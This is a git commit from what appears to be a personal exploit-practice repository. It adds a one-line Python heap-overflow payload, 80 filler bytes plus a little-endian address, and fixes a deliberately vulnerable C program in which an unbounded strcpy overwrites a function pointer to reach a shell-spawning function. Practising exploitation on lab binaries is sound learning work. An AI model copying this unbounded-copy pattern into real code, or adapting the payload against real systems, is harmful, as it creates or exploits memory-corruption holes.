86c46afd4734ab769a36a9f096da7d112991312d
Upinder Singh <upinderawat@gmail.com>
2021-03-30 22:02:58 +0530

    Added trash

---
+++ Buffer_Overflow/Heap/h3.py
@@ -0,0 +1,2 @@
+#! /usr/bin/python
+print('A'*80 + '\x96\x84\x04\x08')
--- Buffer_Overflow/Heap/heap1.c
+++ Buffer_Overflow/Heap/heap1.c
@@ -4,10 +4,10 @@
 
 struct data{
 	char name[64];
-}
+};
 struct fp{
 	int(*fp)();
-}
+};
 void executeShell(){
 	char *name[2];
 	name[0] = "/bin/sh";
@@ -17,16 +17,19 @@ void executeShell(){
 void Failed(){
 	printf("You failed to exploit the heap\n");
 }
-int int main(int argc, char const *argv[])
+int main(int argc, char const *argv[])
 {
 	struct data *d;
 	struct fp *f;
 
 	d = malloc(sizeof(struct data));
 	f = malloc(sizeof(struct fp));
+	printf("data is at %p, fp is at %p\n", d, f);
 	f->fp = Failed;
 
 	strcpy(d->name, argv[1]);
 
 	f->fp();
 }
+//0x555555558000
+//0x40125d
